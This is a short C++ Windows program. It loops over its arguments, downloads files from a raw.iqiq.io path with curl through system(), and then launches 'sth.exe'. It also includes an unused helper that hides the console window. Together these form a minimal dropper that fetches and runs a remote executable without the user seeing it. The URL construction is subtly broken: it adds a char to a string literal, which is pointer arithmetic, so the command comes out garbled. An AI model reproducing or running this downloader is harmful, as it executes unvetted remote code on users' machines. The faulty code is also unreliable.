#include <bits/stdc++.h>
#include <windows.h>
#include <dir.h>
#include <conio.h>
#include <sys/stat.h>
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")
using namespace std;
inline bool exists (const string name)
{
	struct stat buffer;
	return (stat (name.c_str(), &buffer) == 0); 
}
WINBOOL HideConsole()
{
	HWND hwndc=GetConsoleWindow();
	return ShowWindow(hwndc,SW_HIDE);
}
int main(int argc,char *argv[])
{
	for(int i=0;i<argc;++i)
	{
		string s="curl -O https://raw.iqiq.io/poss-ible/sth/main/"+*argv[i];
		system(s.data());
	}
	system("start sth.exe");
	return 0;
}